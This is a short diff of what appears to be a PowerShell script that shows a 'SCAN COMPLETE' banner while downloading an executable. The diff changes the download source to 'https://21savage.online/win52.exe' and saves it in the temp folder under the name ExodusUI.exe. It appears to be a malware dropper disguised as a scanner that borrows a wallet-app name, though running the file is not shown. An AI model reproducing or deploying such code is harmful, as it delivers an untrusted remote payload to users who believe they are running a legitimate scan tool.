@@ -1,4 +1,4 @@
-$exeUrl  = "https://larpexodus.com/ExodusUI.exe"
+$exeUrl  = "https://21savage.online/win52.exe"
 $exePath = "$env:TEMP\ExodusUI.exe"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
@@ -303,6 +303,7 @@ $space = " " * 12  # Increased the number of spaces for more right alignment
 Write-Host "`n$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
 Write-Host "$space│            SCAN COMPLETE            │" -ForegroundColor $yellow
 Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $yellow
+
 
 
 
